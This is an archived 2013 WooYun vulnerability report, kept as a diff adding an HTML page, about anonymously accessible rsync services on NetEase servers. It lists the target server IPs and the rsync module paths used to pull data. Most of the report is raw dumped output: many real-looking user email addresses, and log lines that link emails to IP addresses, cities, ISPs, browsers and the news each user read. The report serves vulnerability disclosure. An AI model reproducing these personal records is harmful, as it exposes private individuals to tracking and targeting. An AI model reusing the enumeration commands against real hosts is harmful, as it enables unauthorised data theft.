@@ -1,0 +1,553 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		网易某服务配置不当 导致2.2亿活跃用户敏感信息泄露  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		网易某服务配置不当 导致2.2亿活跃用户敏感信息泄露  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪猪侠">猪猪侠</a> 
+</li><li>提交时间：		2013-11-26 13:46</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-27：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-07：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-17：	细节向普通白帽子公开<br/>
+									2013-12-27：	细节向实习白帽子公开<br/>
+									2014-01-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">本报告披露内容如下：<br />
+由于网易某服务配置不当，导致所有网易用户的敏感信息将遭受泄露风险，泄露的内容包括（用户邮箱名、用户最后活跃时间、用户IP地址、用户所处位置(精确至地级市)、用户喜好(看什么样的新闻，八卦、女性、体育或者股票)、用户访问习惯、用户使用的什么浏览器、浏览器版本、使用的什么操作系统、操作版本、系统语言信息、屏幕分辨率等等信息）。<br />
+<br />
+由于没有一个通用的防御规则来保护好中间件配置信息、DNS信息、业务数据信息、用户信息、源码备份文件、版本管理工具信息、系统错误信息、日志信息和敏感地址信息(后台或测试地址)的泄露，攻击者可能会通过收集这些保护不足的数据，利用这些信息对系统或用户实施进一步的攻击。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#1 风险描述<br />
+<br />
+多台服务器rsyncd服务可匿名访问<br />
+<br />
+</p><pre><code>123.58.176.101:873<br />
+rsync 123.58.176.101::download <br />
+rsync 123.58.176.101::userreadhistory <br />
+rsync 123.58.176.101::resyslog <br />
+rsync 123.58.176.101::article <br />
+rsync 123.58.176.101::mobilearticle <br />
+rsync 123.58.176.101::auto <br />
+rsync 123.58.176.101::picture</code></pre><p class='detail'> <br />
+<br />
+</p><pre><code>123.58.176.86:873<br />
+rsync 123.58.176.86::hangzhou<br />
+-rw-r--r--   230598932 2013/09/25 11:20:24 201308.gz<br />
+-rw-------         711 2013/09/16 17:48:48 dead.letter<br />
+-rw-rw-r--  4354168737 2013/09/15 03:07:43 login.90.lst.1<br />
+-rw-rw-r--  1819142661 2013/09/15 03:07:43 login.90.lst.1.lzo<br />
+-rw-r--r--  4354170880 2013/09/16 17:55:15 userlist.tar</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>123.58.176.95:873<br />
+rsync 123.58.176.95::log87 <br />
+rsync 123.58.176.95::log88 <br />
+rsync 123.58.176.95::recommend <br />
+rsync 123.58.176.95::category <br />
+rsync 123.58.176.95::download</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>123.58.176.94:873<br />
+rsync 123.58.176.94::log86 <br />
+rsync 123.58.176.94::log84 <br />
+rsync 123.58.176.94::log83 <br />
+rsync 123.58.176.94::log82 <br />
+rsync 123.58.176.94::download</code></pre><p class='detail'><br />
+<br />
+#2 隐私泄露描述<br />
+<br />
+news_userpref，为活跃的1.2亿用户统计信息，这里只是开始<br />
+<br />
+</p><pre><code>rsync 123.58.176.101::article/news_userpref<br />
+[root@10-6-5-175 163]# head -100 news_userpref <br />
+---hsj@163.com  {&quot;1&quot;:0.79,&quot;32&quot;:0.21}<br />
+---xiaomin109@163.com   {&quot;0&quot;:0.33,&quot;1&quot;:0.33,&quot;34&quot;:0.33}<br />
+--0879@163.com  {&quot;1&quot;:0.44,&quot;0&quot;:0.33,&quot;2&quot;:0.22}<br />
+--ccgs@163.com  {&quot;0&quot;:0.42,&quot;1&quot;:0.39,&quot;19&quot;:0.19}<br />
+--ll@163.com    {&quot;1&quot;:0.63,&quot;4&quot;:0.21,&quot;2&quot;:0.16}<br />
+-02-@163.com    {&quot;27&quot;:0.40,&quot;0&quot;:0.32,&quot;1&quot;:0.29}<br />
+-119@163.com    {&quot;0&quot;:0.45,&quot;1&quot;:0.36,&quot;2&quot;:0.18}<br />
+-8311225-@163.com       {&quot;1&quot;:0.50,&quot;2&quot;:0.50}<br />
+-88888-@163.com {&quot;1&quot;:0.65,&quot;0&quot;:0.21,&quot;2&quot;:0.15}<br />
+-_-_-163-_-_-@163.com   {&quot;1&quot;:0.66,&quot;4&quot;:0.19,&quot;16&quot;:0.15}<br />
+-a-a-a@163.com  {&quot;1&quot;:0.41,&quot;0&quot;:0.32,&quot;3&quot;:0.27}<br />
+-cuixindan@163.com      {&quot;4&quot;:0.67,&quot;0&quot;:0.33}<br />
+-frank888-@163.com      {&quot;23&quot;:0.75,&quot;22&quot;:0.25}<br />
+-gaozhijian-@163.com    {&quot;0&quot;:0.70,&quot;2&quot;:0.15,&quot;3&quot;:0.15}<br />
+-hu125@163.com  {&quot;1&quot;:1.00}<br />
+<br />
+[root@10-6-5-175 163]# wc -l news_userpref <br />
+121879322 news_userpref</code></pre><p class='detail'><br />
+<br />
+#3 2.2亿活跃用户列表<br />
+<br />
+</p><pre><code>rsync 123.58.176.86::hangzhou<br />
+drwxr-xr-x        4096 2013/09/25 11:20:24 .<br />
+-rw-r--r--   230598932 2013/09/25 11:20:24 201308.gz<br />
+-rw-------         711 2013/09/16 17:48:48 dead.letter<br />
+-rw-rw-r--  4354168737 2013/09/15 03:07:43 login.90.lst.1<br />
+-rw-rw-r--  1819142661 2013/09/15 03:07:43 login.90.lst.1.lzo<br />
+-rw-r--r--  4354170880 2013/09/16 17:55:15 userlist.tar</code></pre><p class='detail'><br />
+<br />
+WC统计，2.19亿行，不重复<br />
+<br />
+</p><pre><code>wc -l login.90.lst.1<br />
+219060364 login.90.lst.1<br />
+<br />
+tail -n 1000 login.90.lst.1<br />
+zzzqingdao@126.com<br />
+zzzqiye@163.com<br />
+zzzqqq23611@163.com<br />
+zzzqqq258@163.com<br />
+zzzqqq2qqqqq@163.com<br />
+zzzqqq@126.com<br />
+zzzqqqooonnn00@163.com<br />
+zzzqqqwwwfff@163.com<br />
+zzzqwy1314@163.com<br />
+zzzrh2011@163.com<br />
+zzzrjh@163.com<br />
+zzzrrryyxn@163.com<br />
+zzzryan@163.com<br />
+zzzrzhzzz123@163.com<br />
+zzzs0006@126.com<br />
+zzzs136438@163.com<br />
+zzzs840288294@163.com<br />
+zzzs_91@163.com<br />
+zzzsa00020@163.com<br />
+zzzsant@163.com<br />
+zzzsc27405583@163.com<br />
+zzzscq2012@163.com<br />
+zzzscx@163.com<br />
+zzzsdad@163.com<br />
+zzzsdj@126.com<br />
+zzzsdy@163.com<br />
+zzzsf2004@126.com<br />
+zzzsh2012@163.com<br />
+zzzshaoxing@126.com<br />
+zzzshesheshe@163.com<br />
+zzzshhh@126.com<br />
+zzzshi1995@163.com<br />
+zzzship@163.com<br />
+zzzshizihu@163.com<br />
+zzzshu005@126.com<br />
+zzzsilent@126.com<br />
+zzzsjztz@126.com<br />
+zzzss111@126.com<br />
+zzzsshhh@163.com<br />
+zzzssskkknb@163.com<br />
+zzzsssoooyy@163.com<br />
+zzzsssp@126.com<br />
+zzzsssqqq5300@163.com<br />
+zzzst0803@163.com<br />
+zzzst111@163.com</code></pre><p class='detail'><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#4 更严重的隐私泄露<br />
+<br />
+rsync 123.58.176.95::log88/230/<br />
+<br />
+</p><pre><code>目录结构猜测<br />
+log88：               日志88号记录目录<br />
+log88/230/：          IP 230 结尾服务器</code></pre><p class='detail'><br />
+<br />
+log88/230/下的目录分布如下：log88/dir.list<br />
+<br />
+</p><pre><code>#126，#163，#163mail，163v，#188，#2008，#2010，#2012，#3g，#3ghelp，#aipai，#alonebbs，#alumni，#analytics，auto，#baby，#ball，#baoxian，#bbschannel，#biz，#blog，book，jiu，men，yuetu，#caipiao，#campus，#cards，#cbg，#cbgdt2，#cbgqn，#cbgtx2，#cbgxy2，#cbgxy3，#cbgxyq，#cbgxyw，#cc，#chlh，#chlhbbs，#chuangye，#club，#co，#csxy，#csxybbs，#culture，#daxue，digi，#dota，#dotabbs，#dt，#dt2，#dt2bbs，#dtbbs，#ducatio，#ecard，edu，#education，#ek，ent，#epay，#expo2010，#fax，#ff，#ffgamebbs，#ffshequ，#fj，#flowmon，game，#gamebase，#gamecampus，#gameclient，#gamegm，#gamex，#gamezd，#gift，gongyi，#gssumr，#guess09，#gz2010，#haoma，#health，#help，#hi，#home，house，#hr，#idj，#ipush，#itown，#itownsdk，#itownyx，#jifen，lady，#ledehui，#letv，#live，#ljbbs，#lofter，#m163，#market，#marykay，#mc，#media，#mg，#mima，#minisites，mobile，#music，#nbbbs，news，#nie，#niegamezq，#niemh，#nieyx，#pay，#petkingdom，#photo，#pk，#popo，#popogame，#popogamebbs，#qiye，#qnyh，#qnyhbbs，#research，#sc2，#shop，#short，#sms，sports，#st，stock，tech，#tie，#traffic，travel，#tuan，#tuanwap，#tx2，#tx2bbs，#tx3，#uedcblog，#undefined，#urs，#vip，#vip126，#vip163，#vipmail，#vipnb，#wap，#weibo，#wh，#whbbs，#wow，#wscms，#www，#xjc，#xjcbbs，#xtest，#xy2，#xy2bbs，#xy3，#xy3bbs，#xyc，#xyq，#xyqbbs，#xyw，#xywbbs，#ydcidian，#yddictweb，#ydfanyiweb，#yeah，#ymmail，#yuehui，#yxp，#zgfy，#zgfybbs，#zh，#zhbbs</code></pre><p class='detail'><br />
+<br />
+是的，126、163mail目录下，你每次什么时候，从哪里，用什么系统，什么浏览器，从哪里访问的163邮箱，都被记录了下来，具体记录信息如下：<br />
+<br />
+</p><pre><code>rsync 123.58.176.95::log88/230/126/20120618/126_20120618_08.log.gz<br />
+2012-06-18 08:59:12	152d5dccc968626b46e18f0ed557670a	0	0	0	0	http%3A//www.126.com/	126%u7F51%u6613%u514D%u8D39%u90AE--%u4F60%u7684%u4E13%u4E1A%u7535%u5B50%u90AE%u5C40		Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6.5; .NET CLR 2.0.50727)	1440x900	zh-cn	32-bit	1339831803	116.226.216.63	上海市		电信	cindyzyx@126.com	10.0<br />
+2012-06-18 08:59:12	c267312d37e122fe86aba271bd2fce1c	0	0	0	0	http%3A//mail.126.com/	126%u7F51%u6613%u514D%u8D39%u90AE--%u4F60%u7684%u4E13%u4E1A%u7535%u5B50%u90AE%u5C40	http%3A//www.hao123.com/	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)	1440x900	zh-cn	32-bit	1339831803	124.226.232.27	广西	玉林市	电信	lcqxj7332907@126.com	10.0<br />
+2012-06-18 08:59:12	71f4a463946590b290f5820f4774ddff	0	0	0	0	http%3A//mail.126.com/	126%u7F51%u6613%u514D%u8D39%u90AE--%u4F60%u7684%u4E13%u4E1A%u7535%u5B50%u90AE%u5C40	http%3A//www.hao123.com/	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)	1280x768	zh-cn	32-bit	1339831803	114.217.221.233	江苏省	苏州市	电信	fsk0512@126.com	10.0<br />
+2012-06-18 08:59:12	89fa06fadd78e2355a7cf0b40e97c96c	0	0	0	0	http%3A//www.126.com/	126%u7F51%u6613%u514D%u8D39%u90AE--%u4F60%u7684%u4E13%u4E1A%u7535%u5B50%u90AE%u5C40	http%3A//www.2345.com/%3Fkl1234	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)	1440x900	zh-cn	32-bit	1339831803	113.242.180.30	湖南省	益阳市	电信	yiyangfish@126.com	10.0<br />
+2012-06-18 08:59:12	9040f3c0c1cc7a55fac28cb4e9cf66ac	0	0	0	0	http%3A//www.126.com/	126%u7F51%u6613%u514D%u8D39%u90AE--%u4F60%u7684%u4E13%u4E1A%u7535%u5B50%u90AE%u5C40		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)	1024x768	zh-cn	32-bit	1339831803	114.250.117.248	北京市		联通	zhezhe6666@126.com	10.0<br />
+2012-06-18 08:59:12	d9b76fc4659f98e6194b19e469fe05a1	0	0	0	0	http%3A//money.mail.126.com/mybill/bill.do%3Fmethod%3Dappend	%u7406%u8D22%u6613	http%3A//money.mail.126.com/mybill/user.do%3Fmethod%3Dlogin	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)	1024x768	zh-cn	32-bit	1339981155	218.6.161.20	四川省	德阳市	电信	sysqyk@126.com	10.0<br />
+2012-06-18 08:59:12	3a541f05139c71bc1c8d0be16327ff52	0	0	0	0	http%3A//www.126.com/	126%u7F51%u6613%u514D%u8D39%u90AE--%u4F60%u7684%u4E13%u4E1A%u7535%u5B50%u90AE%u5C40		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)	1152x864	zh-cn	16-bit	1339729033	59.42.158.150	广东省	广州市	电信	dlj6035@126.com	10.0<br />
+2012-06-18 08:59:12	dfe208bfdf05809a037bcf4fb101929b	0	1	0	0	http%3A//www.126.com/	126%u7F51%u6613%u514D%u8D39%u90AE--%u4F60%u7684%u4E13%u4E1A%u7535%u5B50%u90AE%u5C40	http%3A//www.2345.com/%3F8438	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)	1024x768	zh-cn	32-bit	1339831803	113.125.77.51	山东省		电信		10.0<br />
+2012-06-18 08:59:12	3c9466f32d37a8953ab03999ed53f783	0	0	0	0	http%3A//www.126.com/	126%u7F51%u6613%u514D%u8D39%u90AE--%u4F60%u7684%u4E13%u4E1A%u7535%u5B50%u90AE%u5C40		Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; qdesk 2.3.1186.202) QQBrowser/6.13.13719.201	1024x768	zh-cn	32-bit	1339831803	111.192.148.185	北京市		联通	sinequanonechinabj@126.com	10.0<br />
+2012-06-18 08:59:12	2a09493f1c0dfa9eefbf3886b3e129b5	0	0	0	0	http%3A//mail.126.com/	126%u7F51%u6613%u514D%u8D39%u90AE--%u4F60%u7684%u4E13%u4E1A%u7535%u5B50%u90AE%u5C40	http%3A//www.hao123.com/	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; CIBA)	1600x900	zh-cn	32-bit	1339831803	1.83.83.223	陕西省	西安市	电信	tdj1963@126.com	10.0</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+服务器上记录的文件结构信息如下（这里仅用股票频道做演示），<br />
+<br />
+说明网易所有用户每秒钟的活动记录都是能被公开下载得到的：<br />
+<br />
+</p><pre><code>drwxr-xr-x        4096 2013/11/26 01:21:02 231/stock<br />
+drwxr-xr-x        4096 2013/11/26 00:29:21 231/stock/20131125<br />
+-rw-rw-rw-     1853726 2013/11/25 01:00:00 231/stock/20131125/stock_20131125_00.log.gz<br />
+-rw-rw-rw-        4894 2013/11/25 01:00:00 231/stock/20131125/stock_20131125_00.pageclick.log.gz<br />
+-rw-rw-rw-        1607 2013/11/25 01:00:00 231/stock/20131125/stock_20131125_00.pageunload.log.gz<br />
+-rw-rw-rw-      926064 2013/11/25 02:00:01 231/stock/20131125/stock_20131125_01.log.gz<br />
+-rw-rw-rw-        2178 2013/11/25 02:00:01 231/stock/20131125/stock_20131125_01.pageclick.log.gz<br />
+-rw-rw-rw-         841 2013/11/25 02:00:01 231/stock/20131125/stock_20131125_01.pageunload.log.gz<br />
+-rw-rw-rw-      509843 2013/11/25 03:00:00 231/stock/20131125/stock_20131125_02.log.gz<br />
+-rw-rw-rw-         947 2013/11/25 03:00:00 231/stock/20131125/stock_20131125_02.pageclick.log.gz<br />
+-rw-rw-rw-         282 2013/11/25 03:00:00 231/stock/20131125/stock_20131125_02.pageunload.log.gz<br />
+-rw-rw-rw-      338266 2013/11/25 04:00:00 231/stock/20131125/stock_20131125_03.log.gz<br />
+-rw-rw-rw-        1044 2013/11/25 04:00:00 231/stock/20131125/stock_20131125_03.pageclick.log.gz<br />
+-rw-rw-rw-         440 2013/11/25 04:00:00 231/stock/20131125/stock_20131125_03.pageunload.log.gz<br />
+-rw-rw-rw-      297079 2013/11/25 05:00:00 231/stock/20131125/stock_20131125_04.log.gz<br />
+-rw-rw-rw-         776 2013/11/25 05:00:00 231/stock/20131125/stock_20131125_04.pageclick.log.gz<br />
+-rw-rw-rw-         499 2013/11/25 05:00:00 231/stock/20131125/stock_20131125_04.pageunload.log.gz<br />
+-rw-rw-rw-      338985 2013/11/25 06:00:00 231/stock/20131125/stock_20131125_05.log.gz<br />
+-rw-rw-rw-        1383 2013/11/25 06:00:00 231/stock/20131125/stock_20131125_05.pageclick.log.gz<br />
+-rw-rw-rw-         358 2013/11/25 06:00:00 231/stock/20131125/stock_20131125_05.pageunload.log.gz<br />
+-rw-rw-rw-      647046 2013/11/25 07:00:00 231/stock/20131125/stock_20131125_06.log.gz<br />
+-rw-rw-rw-        1886 2013/11/25 07:00:00 231/stock/20131125/stock_20131125_06.pageclick.log.gz<br />
+-rw-rw-rw-         594 2013/11/25 07:00:00 231/stock/20131125/stock_20131125_06.pageunload.log.gz<br />
+-rw-rw-rw-     1659008 2013/11/25 08:00:00 231/stock/20131125/stock_20131125_07.log.gz<br />
+-rw-rw-rw-        3551 2013/11/25 08:00:00 231/stock/20131125/stock_20131125_07.pageclick.log.gz<br />
+-rw-rw-rw-        1588 2013/11/25 08:00:00 231/stock/20131125/stock_20131125_07.pageunload.log.gz<br />
+-rw-rw-rw-     6987597 2013/11/25 09:00:00 231/stock/20131125/stock_20131125_08.log.gz<br />
+-rw-rw-rw-       13316 2013/11/25 09:00:00 231/stock/20131125/stock_20131125_08.pageclick.log.gz<br />
+-rw-rw-rw-        5668 2013/11/25 09:00:00 231/stock/20131125/stock_20131125_08.pageunload.log.gz<br />
+-rw-rw-rw-    13412716 2013/11/25 10:00:00 231/stock/20131125/stock_20131125_09.log.gz<br />
+-rw-rw-rw-       32538 2013/11/25 10:00:00 231/stock/20131125/stock_20131125_09.pageclick.log.gz<br />
+-rw-rw-rw-       21126 2013/11/25 10:00:00 231/stock/20131125/stock_20131125_09.pageunload.log.gz<br />
+-rw-rw-rw-    17050040 2013/11/25 11:00:00 231/stock/20131125/stock_20131125_10.log.gz<br />
+-rw-rw-rw-       34854 2013/11/25 11:00:00 231/stock/20131125/stock_20131125_10.pageclick.log.gz<br />
+-rw-rw-rw-       29624 2013/11/25 11:00:00 231/stock/20131125/stock_20131125_10.pageunload.log.gz<br />
+-rw-rw-rw-    20906404 2013/11/25 12:00:00 231/stock/20131125/stock_20131125_11.log.gz<br />
+-rw-rw-rw-       35058 2013/11/25 12:00:00 231/stock/20131125/stock_20131125_11.pageclick.log.gz<br />
+-rw-rw-rw-       27716 2013/11/25 12:00:00 231/stock/20131125/stock_20131125_11.pageunload.log.gz<br />
+-rw-rw-rw-    19234063 2013/11/25 13:00:00 231/stock/20131125/stock_20131125_12.log.gz<br />
+-rw-rw-rw-       29253 2013/11/25 13:00:00 231/stock/20131125/stock_20131125_12.pageclick.log.gz<br />
+-rw-rw-rw-       18189 2013/11/25 13:00:00 231/stock/20131125/stock_20131125_12.pageunload.log.gz<br />
+-rw-rw-rw-    19903348 2013/11/25 14:00:00 231/stock/20131125/stock_20131125_13.log.gz<br />
+-rw-rw-rw-       34293 2013/11/25 14:00:00 231/stock/20131125/stock_20131125_13.pageclick.log.gz<br />
+-rw-rw-rw-       24235 2013/11/25 14:00:00 231/stock/20131125/stock_20131125_13.pageunload.log.gz<br />
+-rw-rw-rw-    20368660 2013/11/25 15:00:00 231/stock/20131125/stock_20131125_14.log.gz<br />
+-rw-rw-rw-       28889 2013/11/25 15:00:00 231/stock/20131125/stock_20131125_14.pageclick.log.gz<br />
+-rw-rw-rw-       24897 2013/11/25 15:00:00 231/stock/20131125/stock_20131125_14.pageunload.log.gz<br />
+-rw-rw-rw-    17830055 2013/11/25 16:00:00 231/stock/20131125/stock_20131125_15.log.gz<br />
+-rw-rw-rw-       28676 2013/11/25 16:00:00 231/stock/20131125/stock_20131125_15.pageclick.log.gz<br />
+-rw-rw-rw-       22735 2013/11/25 16:00:00 231/stock/20131125/stock_20131125_15.pageunload.log.gz<br />
+-rw-rw-rw-    17422385 2013/11/25 17:00:00 231/stock/20131125/stock_20131125_16.log.gz<br />
+-rw-rw-rw-       26583 2013/11/25 17:00:00 231/stock/20131125/stock_20131125_16.pageclick.log.gz<br />
+-rw-rw-rw-       15979 2013/11/25 17:00:00 231/stock/20131125/stock_20131125_16.pageunload.log.gz<br />
+-rw-rw-rw-    13542162 2013/11/25 18:00:00 231/stock/20131125/stock_20131125_17.log.gz<br />
+-rw-rw-rw-       17414 2013/11/25 18:00:00 231/stock/20131125/stock_20131125_17.pageclick.log.gz<br />
+-rw-rw-rw-       11175 2013/11/25 18:00:01 231/stock/20131125/stock_20131125_17.pageunload.log.gz<br />
+-rw-rw-rw-    10498066 2013/11/25 19:00:00 231/stock/20131125/stock_20131125_18.log.gz<br />
+-rw-rw-rw-       15481 2013/11/25 19:00:00 231/stock/20131125/stock_20131125_18.pageclick.log.gz<br />
+-rw-rw-rw-        9597 2013/11/25 19:00:00 231/stock/20131125/stock_20131125_18.pageunload.log.gz<br />
+-rw-rw-rw-    11037448 2013/11/25 20:00:00 231/stock/20131125/stock_20131125_19.log.gz<br />
+-rw-rw-rw-       17269 2013/11/25 20:00:00 231/stock/20131125/stock_20131125_19.pageclick.log.gz<br />
+-rw-rw-rw-        9898 2013/11/25 20:00:00 231/stock/20131125/stock_20131125_19.pageunload.log.gz<br />
+-rw-rw-rw-    11245752 2013/11/25 21:00:00 231/stock/20131125/stock_20131125_20.log.gz<br />
+-rw-rw-rw-       18757 2013/11/25 21:00:00 231/stock/20131125/stock_20131125_20.pageclick.log.gz<br />
+-rw-rw-rw-       10570 2013/11/25 21:00:00 231/stock/20131125/stock_20131125_20.pageunload.log.gz<br />
+-rw-rw-rw-    11222480 2013/11/25 22:00:00 231/stock/20131125/stock_20131125_21.log.gz<br />
+-rw-rw-rw-       17606 2013/11/25 22:00:00 231/stock/20131125/stock_20131125_21.pageclick.log.gz<br />
+-rw-rw-rw-       10225 2013/11/25 22:00:00 231/stock/20131125/stock_20131125_21.pageunload.log.gz<br />
+-rw-rw-rw-     9325031 2013/11/25 23:00:00 231/stock/20131125/stock_20131125_22.log.gz<br />
+-rw-rw-rw-       17338 2013/11/25 23:00:00 231/stock/20131125/stock_20131125_22.pageclick.log.gz<br />
+-rw-rw-rw-        9173 2013/11/25 23:00:00 231/stock/20131125/stock_20131125_22.pageunload.log.gz<br />
+-rw-rw-rw-     4965795 2013/11/26 00:00:00 231/stock/20131125/stock_20131125_23.log.gz<br />
+-rw-rw-rw-       10007 2013/11/26 00:00:00 231/stock/20131125/stock_20131125_23.pageclick.log.gz<br />
+-rw-rw-rw-        5840 2013/11/26 00:00:00 231/stock/20131125/stock_20131125_23.pageunload.log.gz<br />
+drwxr-xr-x        4096 2013/11/26 10:28:58 231/stock/20131126<br />
+-rw-rw-rw-     2560871 2013/11/26 01:00:00 231/stock/20131126/stock_20131126_00.log.gz<br />
+-rw-rw-rw-        5531 2013/11/26 01:00:00 231/stock/20131126/stock_20131126_00.pageclick.log.gz<br />
+-rw-rw-rw-        2764 2013/11/26 01:00:00 231/stock/20131126/stock_20131126_00.pageunload.log.gz<br />
+-rw-rw-rw-     1206358 2013/11/26 02:00:00 231/stock/20131126/stock_20131126_01.log.gz<br />
+-rw-rw-rw-        3118 2013/11/26 02:00:00 231/stock/20131126/stock_20131126_01.pageclick.log.gz<br />
+-rw-rw-rw-        1285 2013/11/26 02:00:00 231/stock/20131126/stock_20131126_01.pageunload.log.gz<br />
+-rw-rw-rw-      708940 2013/11/26 03:00:00 231/stock/20131126/stock_20131126_02.log.gz<br />
+-rw-rw-rw-        2194 2013/11/26 03:00:00 231/stock/20131126/stock_20131126_02.pageclick.log.gz<br />
+-rw-rw-rw-         812 2013/11/26 03:00:00 231/stock/20131126/stock_20131126_02.pageunload.log.gz<br />
+-rw-rw-rw-      505997 2013/11/26 04:00:00 231/stock/20131126/stock_20131126_03.log.gz<br />
+-rw-rw-rw-         973 2013/11/26 04:00:00 231/stock/20131126/stock_20131126_03.pageclick.log.gz<br />
+-rw-rw-rw-         672 2013/11/26 04:00:00 231/stock/20131126/stock_20131126_03.pageunload.log.gz<br />
+-rw-rw-rw-      450348 2013/11/26 05:00:00 231/stock/20131126/stock_20131126_04.log.gz<br />
+-rw-rw-rw-        1191 2013/11/26 05:00:00 231/stock/20131126/stock_20131126_04.pageclick.log.gz<br />
+-rw-rw-rw-         452 2013/11/26 05:00:00 231/stock/20131126/stock_20131126_04.pageunload.log.gz<br />
+-rw-rw-rw-      524052 2013/11/26 06:00:00 231/stock/20131126/stock_20131126_05.log.gz<br />
+-rw-rw-rw-        1085 2013/11/26 06:00:00 231/stock/20131126/stock_20131126_05.pageclick.log.gz<br />
+-rw-rw-rw-         752 2013/11/26 06:00:00 231/stock/20131126/stock_20131126_05.pageunload.log.gz<br />
+-rw-rw-rw-      868755 2013/11/26 07:00:00 231/stock/20131126/stock_20131126_06.log.gz<br />
+-rw-rw-rw-        1955 2013/11/26 07:00:00 231/stock/20131126/stock_20131126_06.pageclick.log.gz<br />
+-rw-rw-rw-         970 2013/11/26 07:00:00 231/stock/20131126/stock_20131126_06.pageunload.log.gz<br />
+-rw-rw-rw-     2183026 2013/11/26 08:00:00 231/stock/20131126/stock_20131126_07.log.gz<br />
+-rw-rw-rw-        5209 2013/11/26 08:00:00 231/stock/20131126/stock_20131126_07.pageclick.log.gz<br />
+-rw-rw-rw-        2316 2013/11/26 08:00:00 231/stock/20131126/stock_20131126_07.pageunload.log.gz<br />
+-rw-rw-rw-     7779321 2013/11/26 09:00:00 231/stock/20131126/stock_20131126_08.log.gz<br />
+-rw-rw-rw-       11865 2013/11/26 09:00:00 231/stock/20131126/stock_20131126_08.pageclick.log.gz<br />
+-rw-rw-rw-        6342 2013/11/26 09:00:00 231/stock/20131126/stock_20131126_08.pageunload.log.gz<br />
+-rw-rw-rw-    12618648 2013/11/26 10:00:00 231/stock/20131126/stock_20131126_09.log.gz<br />
+-rw-rw-rw-       28580 2013/11/26 10:00:00 231/stock/20131126/stock_20131126_09.pageclick.log.gz<br />
+-rw-rw-rw-       19053 2013/11/26 10:00:00 231/stock/20131126/stock_20131126_09.pageunload.log.gz<br />
+-rw-rw-rw-     7332047 2013/11/26 10:29:12 231/stock/20131126/stock_20131126_10.log.gz<br />
+-rw-rw-rw-       12432 2013/11/26 10:28:58 231/stock/20131126/stock_20131126_10.pageclick.log.gz<br />
+-rw-rw-rw-        7832 2013/11/26 10:18:42 231/stock/20131126/stock_20131126_10.pageunload.log.gz</code></pre><p class='detail'><br />
+<br />
+#5 再比如，你什么时候看过什么新闻（做大数据挖掘可以定向挖掘向你推送广告）<br />
+<br />
+</p><pre><code>rsync 123.58.176.101::resyslog/<br />
+-rw-r--r--    58459519 2013/11/20 09:04:05 20131119.gz<br />
+-rw-r--r--    58336428 2013/11/21 09:04:11 20131120.gz<br />
+-rw-r--r--    59811839 2013/11/22 09:04:08 20131121.gz<br />
+-rw-r--r--    57195135 2013/11/23 09:03:58 20131122.gz<br />
+-rw-r--r--    38720647 2013/11/24 09:03:31 20131123.gz<br />
+-rw-r--r--    42148132 2013/11/25 09:03:33 20131124.gz<br />
+-rw-r--r--    63026881 2013/11/26 09:04:09 20131125.gz<br />
+-rw-r--r--     9855448 2013/08/02 15:36:12 pvsort<br />
+-rw-r--r--     9855448 2013/08/02 14:18:31 pvtotal<br />
+tail -n 1000 20131125<br />
+zzmzll@163.com	2013-11-23 21:33:18	8041eb30b95a8ecde0f5cd76b6fbe2aa	http%3A//money.163.com/13/1123/16/9ECK3DBH00252V0H.html%3Ff%3DresysBvalid1%23www_resys	四川省	成都市	zzmzll@163.com<br />
+zzmzll@163.com	2013-11-23 21:42:43	8041eb30b95a8ecde0f5cd76b6fbe2aa	http%3A//auto.163.com/photoview/5DC10008/162839.html%3Ff%3DresysBvalid3%23www_resys	四川省	成都市	zzmzll@163.com<br />
+zzmzspx@126.com	2013-11-23 16:55:35	ed817cbdbc977eaa42c55383335d71c5	http%3A//news.163.com/photoview/00AO0001/40288.html%3Ff%3DresysBvalid3%23www_resys	河南省	郑州市	zzmzspx@126.com<br />
+zzmzynh@163.com	2013-11-23 11:38:10	a77ab27e6618bbb72f69f9f5b65e9cbd	http%3A//v.163.com/zixun/V8GAMA366/V9D9CHOQB.html%3Ff%3DresysBcold2%23www_resys	江苏省	无锡市	zzmzynh@163.com<br />
+zzmzynh@163.com	2013-11-23 11:33:39	a77ab27e6618bbb72f69f9f5b65e9cbd	http%3A//news.163.com/13/1123/09/9EBSKF8A00011229.html%3Ff%3DresysBvalid2%23www_resys	江苏省	无锡市	zzmzynh@163.com<br />
+zznan6789@163.com	2013-11-23 12:36:21	c38c19eb3f6112eaa4b966ad0b31a4ea	http%3A//ent.163.com/13/1123/08/9EBOL7CP00031H2L.html%3Ff%3DresysAvalid1%23www_resys	广东省	惠州市	zznan6789@163.com<br />
